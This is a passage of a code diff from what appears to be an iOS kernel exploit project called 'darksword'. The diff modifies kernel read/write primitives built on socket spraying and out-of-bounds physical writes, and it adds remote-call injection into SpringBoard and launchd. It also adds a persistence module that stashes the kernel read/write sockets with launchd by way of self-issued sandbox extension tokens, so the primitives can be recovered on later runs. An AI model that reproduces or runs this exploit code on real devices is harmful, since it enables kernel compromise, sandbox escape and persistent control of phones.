-static int hide_labels_in_view(uint64_t parentView) {
+static int hide_labels_in_view(RemoteCall *proc, uint64_t parentView) {
     if (!parentView) return 0;
 
-    uint64_t selSubviews   = remote_sel("subviews");
-    uint64_t selCount      = remote_sel("count");
-    uint64_t selObjAtIdx   = remote_sel("objectAtIndex:");
-    uint64_t selSetAllows  = remote_sel("setAllowsLabelArea:");
-    uint64_t selResponds   = remote_sel("respondsToSelector:");
+    uint64_t selSubviews   = remote_sel(proc, "subviews");
+    uint64_t selCount      = remote_sel(proc, "count");
+    uint64_t selObjAtIdx   = remote_sel(proc, "objectAtIndex:");
+    uint64_t selSetAllows  = remote_sel(proc, "setAllowsLabelArea:");
+    uint64_t selResponds   = remote_sel(proc, "respondsToSelector:");
 
-    uint64_t subviews = remote_msg(parentView, selSubviews, 0,0,0,0);
+    uint64_t subviews = remote_msg(proc, parentView, selSubviews, 0,0,0,0);
     if (!subviews) return 0;
-    uint64_t count = remote_msg(subviews, selCount, 0,0,0,0);
+    uint64_t count = remote_msg(proc, subviews, selCount, 0,0,0,0);
     int hidden = 0;
 
     for (uint64_t i = 0; i < count && i < 200; i++) {
-        uint64_t view = remote_msg(subviews, selObjAtIdx, i, 0,0,0);
+        uint64_t view = remote_msg(proc, subviews, selObjAtIdx, i, 0,0,0);
         if (!view) continue;
-        uint64_t selPerform = remote_sel("performSelectorOnMainThread:withObject:waitUntilDone:");
-        if (remote_msg(view, selResponds, selSetAllows, 0,0,0)) {
-            remote_msg(view, selPerform, selSetAllows, 0 /*nil=NO*/, 1 /*YES wait*/, 0);
+        uint64_t selPerform = remote_sel(proc, "performSelectorOnMainThread:withObject:waitUntilDone:");
+        if (remote_msg(proc, view, selResponds, selSetAllows, 0,0,0)) {
+            remote_msg(proc, view, selPerform, selSetAllows, 0 /*nil=NO*/, 1 /*YES wait*/, 0);
             hidden++;
         }
-        uint64_t inner = remote_msg(view, selSubviews, 0,0,0,0);
-        uint64_t innerCount = remote_msg(inner, selCount, 0,0,0,0);
+        uint64_t inner = remote_msg(proc, view, selSubviews, 0,0,0,0);
+        uint64_t innerCount = remote_msg(proc, inner, selCount, 0,0,0,0);
         for (uint64_t j = 0; j < innerCount && j < 50; j++) {
-            uint64_t v2 = remote_msg(inner, selObjAtIdx, j, 0,0,0);
-            if (v2 && remote_msg(v2, selResponds, selSetAllows, 0,0,0)) {
-                remote_msg(v2, selPerform, selSetAllows, 0, 1, 0);
+            uint64_t v2 = remote_msg(proc, inner, selObjAtIdx, j, 0,0,0);
+            if (v2 && remote_msg(proc, v2, selResponds, selSetAllows, 0,0,0)) {
+                remote_msg(proc, v2, selPerform, selSetAllows, 0, 1, 0);
                 hidden++;
             }
         }
     }
     return hidden;
 }
 
-int hide_icon_labels(void) {
-    if (!g_RC_trojanMem) {
+int hide_icon_labels(RemoteCall *proc) {
+    if (!proc) {
         printf("(rc) RemoteCall not initialized\n");
         return -1;
     }
     printf("(rc) Hiding icon labels...\n");
 
-    uint64_t selShared   = remote_sel("sharedInstance");
-    uint64_t selIconMgr  = remote_sel("iconManager");
-    uint64_t selDock     = remote_sel("dockListView");
-    uint64_t selCount    = remote_sel("count");
-    uint64_t selObjAtIdx = remote_sel("objectAtIndex:");
+    uint64_t selShared   = remote_sel(proc, "sharedInstance");
+    uint64_t selIconMgr  = remote_sel(proc, "iconManager");
+    uint64_t selDock     = remote_sel(proc, "dockListView");
+    uint64_t selCount    = remote_sel(proc, "count");
+    uint64_t selObjAtIdx = remote_sel(proc, "objectAtIndex:");
 
-    uint64_t ctrlCls = remote_getClass("SBIconController");
-    uint64_t ctrl = remote_msg(ctrlCls, selShared, 0,0,0,0);
+    uint64_t ctrlCls = remote_getClass(proc, "SBIconController");
+    uint64_t ctrl = remote_msg(proc, ctrlCls, selShared, 0,0,0,0);
     if (!ctrl) { printf("(rc) SBIconController not found\n"); return -1; }
     printf("(rc) SBIconController = 0x%llx\n", ctrl);
 
-    uint64_t mgr = remote_msg(ctrl, selIconMgr, 0,0,0,0);
+    uint64_t mgr = remote_msg(proc, ctrl, selIconMgr, 0,0,0,0);
     int totalHidden = 0;
 
     uint64_t dock = 0;
-    if (mgr) dock = remote_msg(mgr, selDock, 0,0,0,0);
-    if (!dock) dock = remote_msg(ctrl, selDock, 0,0,0,0);
+    if (mgr) dock = remote_msg(proc, mgr, selDock, 0,0,0,0);
+    if (!dock) dock = remote_msg(proc, ctrl, selDock, 0,0,0,0);
     if (dock) {
         printf("(rc) dock = 0x%llx\n", dock);
-        totalHidden += hide_labels_in_view(dock);
+        totalHidden += hide_labels_in_view(proc, dock);
     }
 
-    uint64_t selRootFC    = remote_sel("rootFolderController");
-    uint64_t selListViews = remote_sel("iconListViews");
+    uint64_t selRootFC    = remote_sel(proc, "rootFolderController");
+    uint64_t selListViews = remote_sel(proc, "iconListViews");
     uint64_t rootFC = 0;
-    if (mgr) rootFC = remote_msg(mgr, selRootFC, 0,0,0,0);
+    if (mgr) rootFC = remote_msg(proc, mgr, selRootFC, 0,0,0,0);
     printf("(rc) rootFolderController = 0x%llx\n", rootFC);
 
     if (rootFC) {
-        uint64_t listViews = remote_msg(rootFC, selListViews, 0,0,0,0);
-        uint64_t listCount = remote_msg(listViews, selCount, 0,0,0,0);
+        uint64_t listViews = remote_msg(proc, rootFC, selListViews, 0,0,0,0);
+        uint64_t listCount = remote_msg(proc, listViews, selCount, 0,0,0,0);
         printf("(rc) %llu icon list views\n", listCount);
 
         for (uint64_t i = 0; i < listCount && i < 20; i++) {
-            uint64_t listView = remote_msg(listViews, selObjAtIdx, i, 0,0,0);
-            totalHidden += hide_labels_in_view(listView);
+            uint64_t listView = remote_msg(proc, listViews, selObjAtIdx, i, 0,0,0);
+            totalHidden += hide_labels_in_view(proc, listView);
         }
     }
 
     printf("(rc) Hidden labels on %d icon views\n", totalHidden);
     return totalHidden;
 }
 
-int five_icon_dock(void) {
-    return set_dock_icon_count(5);
+int five_icon_dock(RemoteCall *proc) {
+    return set_dock_icon_count(proc, 5);
 }
 
-int set_dock_icon_count(int count) {
-    if (!g_RC_trojanMem) {
+int set_dock_icon_count(RemoteCall *proc, int count) {
+    if (!proc) {
         printf("(rc) RemoteCall not initialized\n");
         return -1;
     }
@@ -1072,66 +1082,128 @@ int set_dock_icon_count(int count) {
 
     printf("(rc) Starting dock tweak (columns=%d)...\n", count);
 
-    uint64_t selShared    = remote_sel("sharedInstance");
-    uint64_t selIconMgr   = remote_sel("iconManager");
-    uint64_t selDockView  = remote_sel("dockListView");
-    uint64_t selModel     = remote_sel("model");
-    uint64_t selModel2    = remote_sel("iconListModel");
-    uint64_t selGridGet   = remote_sel("gridSize");
-    uint64_t selGridSet   = remote_sel("setGridSize:");
-    uint64_t selLayout    = remote_sel("layout");
-    uint64_t selLayoutCfg = remote_sel("layoutConfiguration");
-    uint64_t selSetCols   = remote_sel("setNumberOfPortraitColumns:");
-    uint64_t selPerform   = remote_sel("performSelectorOnMainThread:withObject:waitUntilDone:");
-    uint64_t selSetNeedsLayout = remote_sel("setNeedsLayout");
+    uint64_t selShared    = remote_sel(proc, "sharedInstance");
+    uint64_t selIconMgr   = remote_sel(proc, "iconManager");
+    uint64_t selDockView  = remote_sel(proc, "dockListView");
+    uint64_t selModel     = remote_sel(proc, "model");
+    uint64_t selModel2    = remote_sel(proc, "iconListModel");
+    uint64_t selGridGet   = remote_sel(proc, "gridSize");
+    uint64_t selGridSet   = remote_sel(proc, "setGridSize:");
+    uint64_t selLayout    = remote_sel(proc, "layout");
+    uint64_t selLayoutCfg = remote_sel(proc, "layoutConfiguration");
+    uint64_t selSetCols   = remote_sel(proc, "setNumberOfPortraitColumns:");
+    uint64_t selPerform   = remote_sel(proc, "performSelectorOnMainThread:withObject:waitUntilDone:");
+    uint64_t selSetNeedsLayout = remote_sel(proc, "setNeedsLayout");
 
     printf("(rc) Selectors registered\n");
     usleep(100000);
 
-    uint64_t cls = remote_getClass("SBIconController");
+    uint64_t cls = remote_getClass(proc, "SBIconController");
     if (!cls) { printf("(rc) SBIconController not found\n"); return -1; }
     usleep(50000);
 
-    uint64_t ctrl = remote_msg(cls, selShared, 0,0,0,0);
+    uint64_t ctrl = remote_msg(proc, cls, selShared, 0,0,0,0);
     if (!ctrl) { printf("(rc) sharedInstance failed\n"); return -1; }
     printf("(rc) ctrl = 0x%llx\n", ctrl);
     usleep(50000);
 
-    uint64_t mgr = remote_msg(ctrl, selIconMgr, 0,0,0,0);
+    uint64_t mgr = remote_msg(proc, ctrl, selIconMgr, 0,0,0,0);
     usleep(50000);
 
     uint64_t dock = 0;
-    if (mgr) dock = remote_msg(mgr, selDockView, 0,0,0,0);
-    if (!dock) dock = remote_msg(ctrl, selDockView, 0,0,0,0);
+    if (mgr) dock = remote_msg(proc, mgr, selDockView, 0,0,0,0);
+    if (!dock) dock = remote_msg(proc, ctrl, selDockView, 0,0,0,0);
     if (!dock) { printf("(rc) dockListView not found\n"); return -1; }
     printf("(rc) dock = 0x%llx\n", dock);
     usleep(50000);
 
-    uint64_t model = remote_msg(dock, selModel, 0,0,0,0);
-    if (!model) model = remote_msg(dock, selModel2, 0,0,0,0);
+    uint64_t model = remote_msg(proc, dock, selModel, 0,0,0,0);
+    if (!model) model = remote_msg(proc, dock, selModel2, 0,0,0,0);
     if (model) {
-        uint64_t oldGrid = remote_msg(model, selGridGet, 0,0,0,0) & 0xFFFFFFFF;
+        uint64_t oldGrid = remote_msg(proc, model, selGridGet, 0,0,0,0) & 0xFFFFFFFF;
         uint64_t newGrid = (oldGrid & 0xFFFF0000) | ((uint64_t)count & 0xFFFFULL);
         usleep(50000);
-        remote_msg(model, selGridSet, newGrid, 0,0,0);
+        remote_msg(proc, model, selGridSet, newGrid, 0,0,0);
         printf("(rc) gridSize 0x%llx -> 0x%llx\n", oldGrid, newGrid);
     }
     usleep(50000);
 
-    uint64_t layout = remote_msg(dock, selLayout, 0,0,0,0);
+    uint64_t layout = remote_msg(proc, dock, selLayout, 0,0,0,0);
     if (layout) {
         usleep(50000);
-        uint64_t cfg = remote_msg(layout, selLayoutCfg, 0,0,0,0);
+        uint64_t cfg = remote_msg(proc, layout, selLayoutCfg, 0,0,0,0);
         if (cfg) {
             usleep(50000);
-            remote_msg(cfg, selSetCols, (uint64_t)count, 0,0,0);
+            remote_msg(proc, cfg, selSetCols, (uint64_t)count, 0,0,0);
             printf("(rc) portraitColumns -> %d\n", count);
         }
     }
     usleep(50000);
 
-    remote_msg(dock, selPerform, selSetNeedsLayout, 0 /*nil*/, 0 /*NO*/, 0);
+    remote_msg(proc, dock, selPerform, selSetNeedsLayout, 0 /*nil*/, 0 /*NO*/, 0);
 
     printf("(rc) done\n");
     return 0;
 }
+
+int enable_upside_down(RemoteCall *proc) {
+    uint64_t clsSBAlertItemRootViewController = remote_getClass(proc, "SBAlertItemRootViewController");
+    uint64_t clsSBHomeScreenViewController = remote_getClass(proc, "SBHomeScreenViewController");
+    uint64_t clsSBCoverSheetPrimarySlidingViewController = remote_getClass(proc, "SBCoverSheetPrimarySlidingViewController");
+    uint64_t clsSBShelfExpansionSwitcherModifier = remote_getClass(proc, "SBShelfExpansionSwitcherModifier");
+    uint64_t clsSBTraitsSceneParticipantDelegate = remote_getClass(proc, "SBTraitsSceneParticipantDelegate");
+    
+    uint64_t selAllowed = remote_sel(proc, "_isAllowedToHavePortraitUpsideDown");
+    uint64_t selOrientations = remote_sel(proc, "supportedInterfaceOrientations");
+    uint64_t selOrientationMode = remote_sel(proc, "_orientationMode");
+    uint64_t selSupportedOrientations = remote_sel(proc, "_supportedOrientations");
+    uint64_t selReturn1 = remote_sel(proc, "_canShowWhileLocked");
+    uint64_t selReturn6 = remote_sel(proc, "transactionCompletionOptions");
+    
+    uint64_t methodAllowed = RemoteArbCall(proc, class_getInstanceMethod, clsSBTraitsSceneParticipantDelegate, selAllowed);
+    uint64_t methodHomeScreen = RemoteArbCall(proc, class_getInstanceMethod, clsSBHomeScreenViewController, selOrientations);
+    uint64_t methodLockScreen = RemoteArbCall(proc, class_getInstanceMethod, clsSBCoverSheetPrimarySlidingViewController, selOrientations);
+    uint64_t methodOrientationMode = RemoteArbCall(proc, class_getInstanceMethod, clsSBTraitsSceneParticipantDelegate, selOrientationMode);
+    uint64_t methodSupportedOrientations = RemoteArbCall(proc, class_getInstanceMethod, clsSBTraitsSceneParticipantDelegate, selSupportedOrientations);
+    uint64_t methodReturn1 = RemoteArbCall(proc, class_getInstanceMethod, clsSBCoverSheetPrimarySlidingViewController, selReturn1);
+    uint64_t methodReturn6 = RemoteArbCall(proc, class_getInstanceMethod, clsSBShelfExpansionSwitcherModifier, selReturn6);
+    uint64_t methodReturn0x1E = RemoteArbCall(proc, class_getInstanceMethod, clsSBAlertItemRootViewController, selOrientations);
+    
+    // swizzle these to a return 6 gadget aka UIInterfaceOrientationMaskPortrait | UIInterfaceOrientationMaskPortraitUpsideDown
+    // -[SBShelfExpansionSwitcherModifier transactionCompletionOptions]:
+    //    mov    w0, #0x6
+    //    ret
+    uint64_t return6Imp = RemoteArbCall(proc, method_getImplementation, methodReturn6);
+    RemoteArbCall(proc, method_setImplementation, methodHomeScreen, (uint64_t)return6Imp);
+    RemoteArbCall(proc, method_setImplementation, methodLockScreen, (uint64_t)return6Imp);
+    
+    // swizzle these to a return 1 gadget
+    uint64_t return1Imp = RemoteArbCall(proc, method_getImplementation, methodReturn1);
+    RemoteArbCall(proc, method_setImplementation, methodAllowed, (uint64_t)return1Imp);
+    
+    // forward _orientationMode to 0x1e //_supportedOrientations
+    //uint64_t supportedImp = RemoteArbCall(proc, method_getImplementation, methodSupportedOrientations);
+    uint64_t return0x1EImp = RemoteArbCall(proc, method_getImplementation, methodReturn0x1E);
+    RemoteArbCall(proc, method_setImplementation, methodOrientationMode, (uint64_t)return0x1EImp);
+    RemoteArbCall(proc, method_setImplementation, methodSupportedOrientations, (uint64_t)return0x1EImp);
+    
+    
+    /*
+     UIInterfaceOrientationMaskPortraitUpsideDown =  1<<2
+     find return 6 gadget
+     
+     SpringBoard`-[SBAlertItemRootViewController supportedInterfaceOrientations]:
+         0x21f3392a8    mov    w0, #0x1e
+         0x21f3392ac    ret
+
+     
+     SpringBoard`-[SBSystemApertureCurtainViewController supportedInterfaceOrientations]:
+     ->  0x22e534d78 <+0>: mov    w0, #0x2 ; =2
+         0x22e534d7c <+4>: ret
+     
+     SpringBoard`-[SBSystemApertureViewController supportedInterfaceOrientations]:
+     ->  0x22e762134 <+0>: mov    w0, #0x2 ; =2
+         0x22e762138 <+4>: ret
+     */
+    return 0;
+}
  ```

  </details>
- 🟡 `lara/kexploit/darksword.h` (modified) — +5 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -10,6 +10,11 @@
 #include <stdbool.h>
 #include <stddef.h>
 
+extern int control_socket;
+extern int rw_socket;
+extern uint64_t kernel_base;
+extern uint64_t kernel_slide;
+
 typedef void (*ds_log_callback_t)(const char *message);
 typedef void (*ds_progress_callback_t)(double progress);
 
  ```

  </details>
- 🟡 `lara/kexploit/darksword.m` (modified) — +31 / -4
  <details><summary>Diff</summary>

  ```diff
  @@ -6,6 +6,7 @@
 //
 
 #include "darksword.h"
+#include "persistence.h"
 #include "utils.h"
 #include "pe/xpaci.h"
 #include "offsets.h"
@@ -235,13 +236,13 @@ static void initprocmarkers(void) {
     }
 }
 
-static int control_socket;
-static int rw_socket;
+int control_socket;
+int rw_socket;
 static uint64_t control_socket_pcb;
 static uint64_t rw_socket_pcb;
 
-static uint64_t kernel_base;
-static uint64_t kernel_slide;
+uint64_t kernel_base;
+uint64_t kernel_slide;
 static uint64_t our_proc;
 static uint64_t our_task;
 
@@ -521,6 +522,16 @@ static void physical_oob_write_mo(mach_port_t mo, uint64_t mo_offset,
 }
 
 static void set_target_kaddr(uint64_t where) {
+    if(!ds_isvalid(where)) {
+        printf("[%s:%d] kaddr isn't valid, spinning here. kaddr: 0x%llx\n", __FUNCTION__, __LINE__, where);
+        
+        void *bt[64]; int n = backtrace(bt, 64);
+        char **s = backtrace_symbols(bt, n);
+        for (int i = 0; i < n; i++) printf("  #%d %s\n", i, s[i]);
+        free(s);
+        
+        __builtin_trap();  // make crash intentionally
+    }
     memset(control_data, 0, EARLY_KRW_LENGTH);
     *(uint64_t *)control_data = where;
     int res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
@@ -581,7 +592,9 @@ static void kwrite_length(uint64_t dst, void *src, uint64_t size) {
 }
 
 static mach_port_t spray_socket(void) {
+    pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
     int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
     if (fd == -1) { return (mach_port_t)-1; }
 
     mach_port_t output_socket_port = MACH_PORT_NULL;
@@ -1021,6 +1034,19 @@ static void pe_a18(void) {
 }
 
 static int pe(void) {
+    if (recover_krw_primitives()) {
+        g_ds_ready = true;
+        pe_log("kernel r/w is ready!");
+        ds_progress(1.0);
+        
+        our_proc = procbypid(getpid());
+        our_task = taskbyproc(our_proc);
+        
+        pe_log("our_proc: 0x%llx", our_proc);
+        pe_log("our_task: 0x%llx", our_task);
+        return 0;
+    }
+    
     ds_progress(0.10);
     struct utsname utsname;
     uname(&utsname);
@@ -1112,6 +1138,7 @@ static int pe(void) {
     
     pe_log("our_proc: 0x%llx", our_proc);
     pe_log("our_task: 0x%llx", our_task);
+    transfer_krw_to_launchd();
     return 0;
 }
 
  ```

  </details>
- 🟡 `lara/kexploit/offsets.h` (modified) — +0 / -3
  <details><summary>Diff</summary>

  ```diff
  @@ -108,10 +108,7 @@ extern uint64_t VM_MAX_KERNEL_ADDRESS;
 void offsets_init(void);
 
 bool dlkerncache(void);
-uint64_t getkernproc(void);
 uint64_t getrootvnode(void);
-uint64_t getprocsize(void);
-bool haskernproc(void);
 uint64_t getmacprocenforceoff(void);
 NSString *getkerncache(void);
 void clearkerncachedata(void);
  ```

  </details>
- 🟡 `lara/kexploit/offsets.m` (modified) — +0 / -19
  <details><summary>Diff</summary>

  ```diff
  @@ -1041,25 +1041,6 @@ bool dlkerncache(void) {
     return resolvekernoffsets(outPath);
 }
 
-uint64_t getkernproc(void) {
-    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprockey];
-    return n ? n.unsignedLongLongValue : 0;
-}
-
-uint64_t getrootvnode(void) {
-    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:krootvnodekey];
-    return n ? n.unsignedLongLongValue : 0;
-}
-
-uint64_t getprocsize(void) {
-    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kkernprocsize];
-    return n ? n.unsignedLongLongValue : 0;
-}
-
-bool haskernproc(void) {
-    return getkernproc() != 0;
-}
-
 uint64_t getmacprocenforceoff(void) {
     NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:kmacprocenforcekey];
     if (n && n.unsignedLongLongValue != 0) {
  ```

  </details>
- 🟡 `lara/kexploit/pe/vfs.m` (modified) — +16 / -42
  <details><summary>Diff</summary>

  ```diff
  @@ -229,19 +229,6 @@ static uint64_t vfs_effective_task(uint64_t proc) {
     return 0;
 }
 
-static uint64_t loadrootvnodeoffset(void) {
-    NSNumber *n = [[NSUserDefaults standardUserDefaults] objectForKey:krootvnodekey];
-    if (!n) return 0;
-    return (uint64_t)n.unsignedLongLongValue;
-}
-
-static uint64_t refresh_rootvnodeoffset(void) {
-    if (!haskernproc() && !dlkerncache()) {
-        return 0;
-    }
-    return getrootvnode();
-}
-
 static int vfs_findprocs(void) {
     g_our_proc = vfs_effective_proc();
     if (!isheappointer(g_our_proc)) {
@@ -551,35 +538,7 @@ int vfs_init(void) {
     vfs_progress(0.35);
 
     if (g_ready) {
-        uint64_t rootvnode_offset = loadrootvnodeoffset();
-        if (rootvnode_offset == 0) {
-            klog("rootvnode offset missing; trying kernelcache resolve");
-            rootvnode_offset = refresh_rootvnodeoffset();
-        }
-        if (rootvnode_offset != 0) {
-            uint64_t sym = KBASE + rootvnode_offset;
-            uint64_t root = kreadpointer(sym);
-            klog("rootvnode offset probe: 0x%llx (sym=0x%llx)", root, sym);
-            if (isheappointer(root)) {
-                g_rootvnode = root;
-                klog("rootvnode via offset: 0x%llx", g_rootvnode);
-            } else {
-                klog("rootvnode pointer invalid (offset=0x%llx)", rootvnode_offset);
-                
-                uint64_t fresh = refresh_rootvnodeoffset();
-                if (fresh && fresh != rootvnode_offset) {
-                    uint64_t sym2 = KBASE + fresh;
-                    uint64_t root2 = kreadpointer(sym2);
-                    klog("rootvnode offset reprobe: 0x%llx (sym=0x%llx)", root2, sym2);
-                    if (isheappointer(root2)) {
-                        g_rootvnode = root2;
-                        klog("rootvnode via reprobe: 0x%llx", g_rootvnode);
-                    }
-                }
-            }
-        } else {
-            klog("rootvnode offset missing; listdir will be unavailable");
-        }
+        g_rootvnode = getrootvnode();
         vfs_progress(0.60);
 
         if (isheappointer(g_rootvnode)) {
@@ -894,3 +853,18 @@ int vfs_zeropage(const char *path, off_t offset) {
     close(fd);
     return 0;
 }
+
+uint64_t getrootvnode(void) {
+    if (!g_ready) return -1;
+    uint64_t launchd_proc = procbypid(1);
+    uint64_t launchd_vnode = ds_kread64(launchd_proc + off_proc_p_textvp);
+    launchd_vnode = pacstrip(launchd_vnode);
+    
+    uint64_t sbin_vnode = ds_kread64(launchd_vnode + off_vnode_v_parent);
+    sbin_vnode = pacstrip(sbin_vnode);
+    
+    uint64_t root_vnode = ds_kread64(sbin_vnode + off_vnode_v_parent);
+    root_vnode = pacstrip(root_vnode);
+    
+    return root_vnode;
+};
  ```

  </details>
- 🟢 `lara/kexploit/persistence.h` (added) — +23 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,23 @@
+//
+//  persistence.h
+//  darksword-kexploit-fun
+//
+//  Created by Duy Tran on 11/4/26.
+//
+
+#import "darksword.h"
+@import Darwin;
+
+extern kern_return_t bootstrap_register(mach_port_t bp, const char *service_name, mach_port_t sp);
+extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
+
+int64_t sandbox_extension_consume(const char *extension_token);
+char *sandbox_extension_issue_mach(const char *extension_class, const char *name, uint32_t flags);
+
+#define CONTROL_PORT_NAME "krw.darksword.control_port"
+#define RW_PORT_NAME "krw.darksword.rw_port"
+#define APP_MACH_LOOKUP "com.apple.security.exception.mach-lookup.global-name"
+#define APP_MACH_REGISTER "com.apple.security.exception.mach-register.global-name"
+
+bool transfer_krw_to_launchd(void);
+bool recover_krw_primitives(void);
  ```

  </details>
- 🟢 `lara/kexploit/persistence.m` (added) — +144 / -0
  <details><summary>Diff</summary>

  ```diff
  @@ -0,0 +1,144 @@
+//
+//  persistence.m
+//  darksword-kexploit-fun
+//
+//  Created by Duy Tran on 11/4/26.
+//
+
+#import <Foundation/Foundation.h>
+#import <sys/fileport.h>
+#import "darksword.h"
+#import "offsets.h"
+#import "persistence.h"
+#import "utils.h"
+
+#import "TaskRop/RemoteCall.h"
+
+bool recover_proc_self(uint64_t launchd_proc);
+
+bool transfer_krw_to_launchd(void) {
+    RemoteCall *proc = [[RemoteCall alloc] initWithProcess:@"launchd" useMigFilterBypass:NO];
+    if (!proc) {
+        printf("[-] Failed to create RemoteCall for launchd\n");
+        return false;
+    }
+    uint64_t mem = proc.trojanMem;
+    uint64_t tokenRemote;
+    proc[mem].string = @(APP_MACH_REGISTER);
+    
+    // sandbox_extension_issue_mach(APP_MACH_REGISTER, CONTROL_PORT_NAME, 0)
+    proc[mem+0x100].string = @(CONTROL_PORT_NAME);
+    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
+    if (!tokenRemote) {
+        printf("[-] Failed to get token for CONTROL_PORT_NAME\n");
+        return false;
+    }
+    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
+    sandbox_extension_consume(proc[mem+0x200].string.UTF8String);
+    
+    // sandbox_extension_issue_mach(APP_MACH_REGISTER, CONTROL_PORT_NAME, 0)
+    proc[mem+0x100].string = @(RW_PORT_NAME);
+    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
+    assert(tokenRemote); // should not fail
+    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
+    sandbox_extension_consume(proc[mem+0x200].string.UTF8String);
+    
+    // Now do the actual thing
+    // need to strcpy output token because vm_shmem fails for some reason
+    kern_return_t kr;
+    mach_port_t control_socketPort, rw_socketPort;
+    fileport_makeport(control_socket, &control_socketPort);
+    fileport_makeport(rw_socket, &rw_socketPort);
+    if(!control_socketPort || !rw_socketPort) {
+        printf("[-] fileport_makeport failed\n");
+        return false;
+    }
+    
+    NSMutableDictionary *primitive = [NSMutableDictionary dictionary];
+    primitive[@"KernelBase"] = @(kernel_base);
+    primitive[@"KernelSlide"] = @(kernel_slide);
+    primitive[@"LaunchdProcAddr"] = @(procbypid(1));
+    
+    // stash ports to launchd and issue sandbox extensions for them
+    kr = bootstrap_register(bootstrap_port, CONTROL_PORT_NAME, control_socketPort);
+    if(kr != KERN_SUCCESS) {
+        printf("[-] bootstrap_register failed for %s: %s\n", CONTROL_PORT_NAME, mach_error_string(kr));
+        return false;
+    }
+    kr = bootstrap_register(bootstrap_port, RW_PORT_NAME, rw_socketPort);
+    if(kr != KERN_SUCCESS) {
+        printf("[-] bootstrap_register failed for %s: %s\n", RW_PORT_NAME, mach_error_string(kr));
+        return false;
+    }
+    
+    // sandbox_extension_issue_mach(APP_MACH_LOOKUP, CONTROL_PORT_NAME, 0);
+    proc[mem].string = @(APP_MACH_LOOKUP);
+    proc[mem+0x100].string = @(CONTROL_PORT_NAME);
+    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
+    assert(tokenRemote); // should not fail
+    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
+    primitive[@"ControlPort"] = proc[mem+0x200].string;
+    
+    // sandbox_extension_issue_mach(APP_MACH_LOOKUP, RW_PORT_NAME, 0);
+    proc[mem+0x100].string = @(RW_PORT_NAME);
+    tokenRemote = RemoteArbCall(proc, sandbox_extension_issue_mach, mem, mem+0x100, 0);
+    assert(tokenRemote); // should not fail
+    RemoteArbCall(proc, strcpy, mem+0x200, tokenRemote, 0);
+    primitive[@"RWPort"] = proc[mem+0x200].string;
+    
+    NSLog(@"Primitive: %@", primitive);
+    [NSUserDefaults.standardUserDefaults setObject:primitive forKey:@"KRWPrimitive"];
+    
+    [proc destroyRemoteCall];
+    return true;
+}
+
+bool recover_krw_primitives(void) {
+    // TODO: move primitive data to a file that can be retrieved using bookmark data
+    NSDictionary *primitive = [NSUserDefaults.standardUserDefaults dictionaryForKey:@"KRWPrimitive"];
+    if (!primitive) {
+        printf("[-] No stashed primitive found\n");
+        return false;
+    }
+    
+    kern_return_t kr;
+    mach_port_t control_socketPort, rw_socketPort;
+    
+    if (sandbox_extension_consume([primitive[@"ControlPort"] UTF8String] ?: "") < 1 ||
+        sandbox_extension_consume([primitive[@"RWPort"] UTF8String] ?: "") < 1) {
+        printf("[-] sandbox_extension_consume failed\n");
+        //return false;
+        // don't return. It may fail if we're consuming it myself
+    }
+    
+    kr = bootstrap_look_up(bootstrap_port, CONTROL_PORT_NAME, &control_socketPort);
+    kr = bootstrap_look_up(bootstrap_port, RW_PORT_NAME, &rw_socketPort);
+    if(kr != KERN_SUCCESS) {
+        printf("[-] bootstrap_look_up failed: %s\n", mach_error_string(kr));
+        return false;
+    }
+    
+    control_socket = fileport_makefd(control_socketPort);
+    rw_socket = fileport_makefd(rw_socketPort);
+    printf("[+] Recovered control_socket: %d\n", control_socket);
+    printf("[+] Recovered rw_socket: %d\n", rw_socket);
+    
+    kernel_base = [primitive[@"KernelBase"] unsignedLongLongValue];
+    kernel_slide = [primitive[@"KernelSlide"] unsignedLongLongValue];
+    // see if it works properly
+    if (ds_kread32(kernel_base) != 0xFEEDFACF || ds_kread32(kernel_base + 4) != CPU_TYPE_ARM64) {
+        printf("[-] kread failed\n");
+        return false;
+    }
+    
+    if (!recover_proc_self([primitive[@"LaunchdProcAddr"] unsignedLongLongValue])) {
+        printf("[-] Failed to recover proc_self\n");
+        return false;
+    }
+    
+    printf("early_kread64(%#llx) -> %#llx\n", kernel_base,
+           ds_kread64(kernel_base));
+    fflush(stdout);
+
+    return true;
+}
  ```

  </details>
- 🟡 `lara/kexploit/utils.h` (modified) — +0 / -1
  <details><summary>Diff</summary>

  ```diff
  @@ -19,7 +19,6 @@ extern "C" {
 #endif
 
 void init_offsets(void);
-uint64_t getprocsize(void);
 uint64_t ourproc(void);
 uint64_t taskbyproc(uint64_t procaddr);
 uint64_t procbyname(const char *procname);
  ```

  </details>
- 🟡 `lara/kexploit/utils.m` (modified) — +72 / -106
  <details><summary>Diff</summary>

  ```diff
  @@ -43,7 +43,6 @@
 static const uint32_t PROC_PREV_OFFSET = 0x00;      // p_list le_prev
 static const uint32_t PROC_PFLAG_OFFSET = 0x454;
 static const uint32_t ARM_SS_OFFSET = 0x8;
-uint64_t PROC_STRUCT_SIZE;
 uint32_t TASK_TNEXT_OFFSET;
 uint32_t THREAD_MUPCB_OFFSET;
 
@@ -67,14 +66,6 @@ void init_offsets(void) {
 
     sysctlbyname("kern.osproductversion", ios, &size, NULL, 0);
 
-    uint64_t procsize = getprocsize();
-    if (procsize != 0) {
-        PROC_STRUCT_SIZE = procsize;
-    } else {
-        printf("(utils) getprocsize() returned 0x0. defaulting to 0x740.\n");
-        PROC_STRUCT_SIZE = 0x740;
-    }
-
     int major = 0, minor = 0, patch = 0;
